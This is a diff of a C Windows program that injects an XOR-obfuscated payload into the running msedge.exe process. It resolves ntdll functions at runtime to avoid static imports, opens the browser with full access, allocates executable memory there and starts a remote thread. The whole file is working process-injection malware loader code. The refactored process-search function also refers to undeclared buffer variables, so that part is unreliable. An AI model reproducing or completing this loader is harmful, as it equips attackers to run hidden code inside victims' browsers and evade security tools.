@@ -1,13 +1,17 @@
 #include <windows.h>
 #include <winternl.h> 
-#include <stdlib.h> // For memory allocation functions
+#include <stdlib.h>
 #include <stdio.h>
-#include <wchar.h> // For wide-character string functions
+#include <wchar.h>
 #include "buffer.h"
 
-
+// Define success and error codes
 #ifndef STATUS_SUCCESS
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+#endif
+
+#ifndef STATUS_INFO_LENGTH_MISMATCH
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
 #endif
 
 // For initializing OBJECT_ATTRIBUTES
@@ -22,212 +26,140 @@
 }
 #endif
 
-// For NTSTATUS and NTAPI definitions// Typedefs for the NTAPI functions to use
-typedef NTSTATUS(NTAPI* pfnNtAllocateVirtualMemory)(
-    HANDLE ProcessHandle,
-    PVOID* BaseAddress,
-    ULONG_PTR ZeroBits,
-    PSIZE_T RegionSize,
-    ULONG AllocationType,
-    ULONG Protect);
+// Function pointers for NTAPI functions
+typedef NTSTATUS (NTAPI* pfnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS (NTAPI* pfnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
+typedef NTSTATUS (NTAPI* pfnNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, CLIENT_ID*);
+typedef NTSTATUS (NTAPI* pfnNtClose)(HANDLE);
+typedef NTSTATUS (NTAPI* pfnRtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, CLIENT_ID*);
+typedef NTSTATUS (NTAPI* pfnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 
-typedef NTSTATUS(NTAPI* pfnNtWriteVirtualMemory)(
-    HANDLE ProcessHandle,
-    PVOID BaseAddress,
-    PVOID Buffer,
-    ULONG NumberOfBytesToWrite,
-    PULONG NumberOfBytesWritten);
+// Declare global pointers to functions
+pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
+pfnNtWriteVirtualMemory NtWriteVirtualMemory = NULL;
+pfnNtOpenProcess NtOpenProcess = NULL;
+pfnNtClose NtClose = NULL;
+pfnRtlCreateUserThread RtlCreateUserThread = NULL;
+pfnNtQuerySystemInformation NtQuerySystemInformation = NULL;
 
-typedef NTSTATUS(NTAPI* pfnRtlCreateUserThread)(
-    HANDLE ProcessHandle,
-    PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
-    BOOLEAN CreateSuspended,
-    ULONG StackZeroBits,
-    PULONG StackReserved,
-    PULONG StackCommit,
-    PVOID StartAddress,
-    PVOID StartParameter,
-    PHANDLE ThreadHandle,
-    CLIENT_ID* ClientID);
+// Function to dynamically load NTAPIs
+void LoadAPIs() {
+    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
 
-typedef NTSTATUS(NTAPI* pfnNtClose)(
-    HANDLE);
-typedef NTSTATUS(NTAPI* pfnNtOpenProcess)(
-    PHANDLE, 
-    ACCESS_MASK, 
-    POBJECT_ATTRIBUTES, 
-    CLIENT_ID*);
+    NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    NtWriteVirtualMemory = (pfnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+    NtOpenProcess = (pfnNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
+    NtClose = (pfnNtClose)GetProcAddress(hNtdll, "NtClose");
+    RtlCreateUserThread = (pfnRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
+    NtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
+}
 
-
-#ifndef STATUS_INFO_LENGTH_MISMATCH
-#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
-#endif
-
-
-// Typedef for NtQuerySystemInformation
-typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
-    SYSTEM_INFORMATION_CLASS SystemInformationClass,
-    PVOID SystemInformation,
-    ULONG SystemInformationLength,
-    PULONG ReturnLength);
-
-
-// XORs each byte of the buffer with a given key
+// XOR each byte of the buffer with a given key
 void XOR(unsigned char* data, size_t data_len) {
     for (int i = 0; i < data_len; i++) {
         data[i] = data[i] ^ 0xAA;
     }
 }
 
+int FindTarget(const wchar_t* target_process) {
 
-int FindTarget(const wchar_t* process, HMODULE hNtdll) {
-
-    // Get the NtQuerySystemInformation function address
-    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
-    if (!NtQuerySystemInformation) {
-        FreeLibrary(hNtdll);
+    buffer = malloc(bufferSize);
+    if (!buffer) {
         return 1;
     }
 
-    // Prepare to call NtQuerySystemInformation
-    PVOID buffer = NULL;
-    ULONG bufferSize = 0;
-    NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
-    int pid = 0;
-
-    // The first call gets the required buffer size.
-    if (status == STATUS_INFO_LENGTH_MISMATCH) {
-        buffer = malloc(bufferSize);
-        if (!buffer) {
-            FreeLibrary(hNtdll);
+    NTSTATUS status;
+    // Reallocate buffer as needed
+    while ((status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &neededSize)) == STATUS_INFO_LENGTH_MISMATCH) {
+        bufferSize = neededSize;
+        PVOID tempBuffer = realloc(buffer, bufferSize);
+        if (!tempBuffer) {
+            free(buffer);
             return 1;
         }
-
-        // Call again with the correct size
-        status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
+        buffer = tempBuffer;
     }
 
-    // Here is the structure of "SYSTEM_PROCESS_INFORMATION"
-    // https://processhacker.sourceforge.io/doc/struct___s_y_s_t_e_m___p_r_o_c_e_s_s___i_n_f_o_r_m_a_t_i_o_n.html
-    if (NT_SUCCESS(status)) {
-        // Iterate over the SYSTEM_PROCESS_INFORMATION structures in buffer
-        PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
-        while (spi) {
-            if (spi->ImageName.Length && spi->UniqueProcessId != 0) {
-
-                size_t procnameSize = (spi->ImageName.Length + sizeof(WCHAR));
-                WCHAR* procname = (WCHAR*)malloc((spi->ImageName.Length + sizeof(WCHAR)));
-                // Dynamic allocation for the process name
-                if (procname == NULL) {
-                    return pid; // Handle error appropriately
-                }
-
-                // Correct usage, ensuring there's space for null terminator:
-                wcsncpy_s(procname, procnameSize, spi->ImageName.Buffer, spi->ImageName.Length / sizeof(WCHAR));
-
-                // Ensuring NULL termination
-                procname[spi->ImageName.Length / sizeof(WCHAR)] = L'\0';
-
-                // Compare procname with another process name
-                if (wcscmp(procname, process) == 0) {
-                    // If procname and process are equal
-                    int pid = (int)(spi->UniqueProcessId);
-                    free(procname);
-                    return pid;
-                    break;
-                }
-
-                // Free the allocated memory for procname when done
-                free(procname);
-                if (spi->NextEntryOffset == 0) {
-                    break;
-                }
-
-            }
-            spi = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)spi) + spi->NextEntryOffset);
-        }
-    }
-
-    // Cleanup
-    if (buffer) {
+    if (!NT_SUCCESS(status)) {
         free(buffer);
+        return 0;
     }
-    FreeLibrary(hNtdll);
-    return pid;
+
+    PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
+    int pid = 0;
+
+    do {
+		if (spi->ImageName.Buffer && wcscmp(spi->ImageName.Buffer, target_process) == 0) {
+			pid = (int)spi->UniqueProcessId;
+			break;
+		}
+		spi = (SYSTEM_PROCESS_INFORMATION*)((char*)spi + spi->NextEntryOffset);
+	} while (spi->NextEntryOffset != 0);
+
+	free(buffer);
+	return pid;
+
 }
 
-// Implement the Inject function using NTAPI
-int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len, HMODULE hNtdll) {
-
-    // Get the NTAPI function addresses
-    pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-    pfnNtWriteVirtualMemory NtWriteVirtualMemory = (pfnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-    pfnRtlCreateUserThread RtlCreateUserThread = (pfnRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
-    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !RtlCreateUserThread) return -1;
+int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len) {
 
     PVOID pRemoteCode = NULL;
     SIZE_T ulSize = buf_len;
     NTSTATUS status;
 
-    // Allocate memory in the target process
     status = NtAllocateVirtualMemory(hProc, &pRemoteCode, 0, &ulSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (!NT_SUCCESS(status)) return -1;
 
-    // Write the payload to the allocated memory
     ULONG bytesWritten;
     status = NtWriteVirtualMemory(hProc, pRemoteCode, buf, buf_len, &bytesWritten);
     if (!NT_SUCCESS(status) || bytesWritten != buf_len) return -1;
 
     HANDLE hThread = NULL;
-    // Create a remote thread to execute the payload
     status = RtlCreateUserThread(hProc, NULL, FALSE, 0, NULL, NULL, pRemoteCode, NULL, &hThread, NULL);
     if (!NT_SUCCESS(status) || hThread == NULL) return -1;
 
     WaitForSingleObject(hThread, INFINITE);
     CloseHandle(hThread);
 
-    return 0; // Success
+    return 0;
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
-    int pid = 0;
-
     const wchar_t* target_process = L"msedge.exe";
+
+    int pid = 0;
 
     // Setup for calling NtOpenProcess
     HANDLE hProc;
-    OBJECT_ATTRIBUTES ObjAttr;
+    OBJECT_ATTRIBUTES object_attributes;
     CLIENT_ID clientId;
 
     // Load ntdll.dll which contains the NTAPI functions
     HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
     if (!hNtdll) return -1;
 
-    pfnNtOpenProcess NtOpenProcess = (pfnNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
-    pfnNtClose NtClose = (pfnNtClose)GetProcAddress(hNtdll, "NtClose");
+    LoadAPIs();
+    // Check initialization
+    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtOpenProcess || !NtClose || !RtlCreateUserThread || !NtQuerySystemInformation) return -1; 
 
-    if (!NtClose || !NtOpenProcess) return -1;
-
-
-    // Find the process ID
-    pid = FindTarget(target_process, hNtdll);
+    pid = FindTarget(target_process);
 
     if (pid == 0) {
         wprintf(L"failed to find %s process\n", target_process);
         return 0;
     }
 
-    clientId.UniqueProcess = (HANDLE)pid; // Target Process ID
-    clientId.UniqueThread = 0; // Not specifying a thread
+    clientId.UniqueProcess = (HANDLE)pid;
+    clientId.UniqueThread = 0;
 
-    InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);
+    InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);
 
-    NTSTATUS status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &ObjAttr, &clientId);
+    NTSTATUS status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &clientId);
 
     if (status == STATUS_SUCCESS) {
-        XOR(buf, sizeof(buf)); // put this into inject payload
-        Inject(hProc, buf, sizeof(buf), hNtdll);
+        XOR(buf, sizeof(buf));
+        Inject(hProc, buf, sizeof(buf));
         NtClose(hProc);
     }
 
